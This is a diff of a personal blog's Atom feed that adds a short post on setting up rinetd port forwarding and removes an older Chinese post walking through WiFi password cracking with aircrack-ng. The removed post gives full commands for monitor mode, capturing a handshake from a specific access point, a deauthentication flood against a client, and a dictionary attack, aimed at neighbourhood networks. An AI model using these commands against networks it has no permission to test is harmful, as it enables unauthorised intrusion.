@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://m2shad0w.com/"/>
-  <updated>2016-07-11T07:27:43.000Z</updated>
+  <updated>2016-07-15T07:02:01.000Z</updated>
   <id>http://m2shad0w.com/</id>
   
   <author>
@@ -14,6 +14,42 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>rinetd端口转发工具</title>
+    <link href="http://m2shad0w.com/2016/07/13/rinetd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
+    <id>http://m2shad0w.com/2016/07/13/rinetd端口转发工具/</id>
+    <published>2016-07-13T09:04:50.000Z</published>
+    <updated>2016-07-15T07:02:01.000Z</updated>
+    
+    <content type="html">&lt;h3 id=&quot;rinetd端口转发工具&quot;&gt;rinetd端口转发工具&lt;/h3&gt;&lt;p&gt;端口转发是比较实用的，内网服务器，某些机器并不想直接暴露在外边，就可以通过端口转发到跳板机上。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;从&lt;a href=&quot;https://www.boutell.com/rinetd/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;工具地址&lt;/a&gt; 下载&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wget $url&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;解压压缩包，并且进入工作目录，修改端口范围&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sed -i &amp;#39;s/65536/65535/g&amp;#39; rinetd.c&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接着执行&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mkdir /usr/man&amp;amp;&amp;amp;make&amp;amp;&amp;amp;make install&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&quot;创建配置文件&quot;&gt;创建配置文件&lt;/h3&gt;&lt;p&gt;&lt;code&gt;vi /etc/rinetd.conf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;输入&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$src $port $des $port&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;启动&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;rinetd&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&quot;开机启动&quot;&gt;开机启动&lt;/h3&gt;&lt;p&gt;&lt;code&gt;echo rinetd &amp;gt;&amp;gt;/etc/rc.local&lt;/code&gt;&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;rinetd端口转发工具&quot;&gt;rinetd端口转发工具&lt;/h3&gt;&lt;p&gt;端口转发是比较实用的，内网服务器，某些机器并不想直接暴露在外边，就可以通过端口转发到跳板机上。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="bigdata" scheme="http://m2shad0w.com/categories/bigdata/"/>
+    
+    
+      <category term="rinetd" scheme="http://m2shad0w.com/tags/rinetd/"/>
+    
+  </entry>
   
   <entry>
     <title>centos7安装nginx</title>
@@ -623,55 +659,6 @@
     
     
       <category term="flume" scheme="http://m2shad0w.com/tags/flume/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>crackWifiPasswd</title>
-    <link href="http://m2shad0w.com/2016/02/15/crackWifiPasswd/"/>
-    <id>http://m2shad0w.com/2016/02/15/crackWifiPasswd/</id>
-    <published>2016-02-15T09:30:25.000Z</published>
-    <updated>2016-04-25T11:45:21.000Z</updated>
-    
-    <content type="html">&lt;h3 id=&quot;无线破解&quot;&gt;无线破解&lt;/h3&gt;&lt;p&gt;声明: 仅作研究的一个笔记。 在小区内有很多的wifi热点, 正好手头有一个无线网卡, 尝试破解wifi密码。&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;h3 id=&quot;背景知识&quot;&gt;背景知识&lt;/h3&gt;&lt;p&gt;常用的wifi加密web、wpa、wpa2, wifi破解屌爆了的工具aircrack-ng, 密码字典。&lt;/p&gt;
-&lt;h3 id=&quot;破解实战&quot;&gt;破解实战&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;将无线网卡处于混杂模式（能够监听周围通过网卡的数据）&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;airmon-ng&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/63fe561egw1f1159fnr4lj214c0c8q60.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;airmon-ng start wlan0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/mw690/63fe561egw1f115chobo8j214w0matgn.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;回显的时候 提示有些存在的进程可能会影响airodump正常工作，确保正常工作，需要执行一下命令&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;airmon-ng check &lt;span class=&quot;built_in&quot;&gt;kill&lt;/span&gt; all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;iwconfig wlan0mon &lt;span class=&quot;comment&quot;&gt;# 查看网卡是否处于混杂模式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;airodump-ng waln0mon &lt;span class=&quot;comment&quot;&gt;# 查看周围的无线网络&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/63fe561egw1f115lckxtdj21e80nkam7.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;语法:airodump-ng –channel [x] –bssid [bssid] –write [filename] [interface?mon0]&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;airodump-ng  -w qiu --bssid FC:D7:&lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;B:&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; wlan0mon&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;code&gt;再开一个终端, 模拟客户端mac, 进行网络洪水攻击, 直到抓到重连握手包&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;aireplay-ng -&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; --ignore-negative-one  &lt;span class=&quot;operator&quot;&gt;-a&lt;/span&gt;  FC:D7:&lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;B:&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;  -c &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;C:BE:&lt;span class=&quot;number&quot;&gt;08&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;B:&lt;span class=&quot;number&quot;&gt;81&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;  wlan0mon&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;aircrack-ng -w WPA字典.txt qiu-*.cap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/63fe561egw1f13jd6q1o7j217o0wgwpo.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;!hack the passwd&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;&lt;p&gt;抓到wifi的握手包之后，就是跑密码字典了，精心设计密码字典，就会事半功倍！破解wifi之后，还有更多好玩的东西！&lt;/p&gt;
-&lt;h3 id=&quot;参考文献&quot;&gt;参考文献&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/wireless/59809.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/wireless/59809.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://aircrack-ng.org/documentation.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://aircrack-ng.org/documentation.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.aircrack-ng.org/doku.php?id=cracking_wpa&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.aircrack-ng.org/doku.php?id=cracking_wpa&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://sweetll.me/2014/11/ubuntu-14-10-%E5%AF%B9%E4%BA%8Ewifi%E5%AF%86%E7%A0%81%E7%9A%84%E7%A0%B4%E8%A7%A3%E7%A0%94%E7%A9%B6-%E4%BB%A5%E5%8F%8A%E7%A0%B4%E8%A7%A3wifi%E5%90%8E%E8%83%BD%E5%B9%B2%E4%BB%80%E4%B9%88/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://sweetll.me&lt;/a&gt;&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;无线破解&quot;&gt;无线破解&lt;/h3&gt;&lt;p&gt;声明: 仅作研究的一个笔记。 在小区内有很多的wifi热点, 正好手头有一个无线网卡, 尝试破解wifi密码。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="crack" scheme="http://m2shad0w.com/categories/crack/"/>
-    
-    
-      <category term="aircrack" scheme="http://m2shad0w.com/tags/aircrack/"/>
     
   </entry>
   
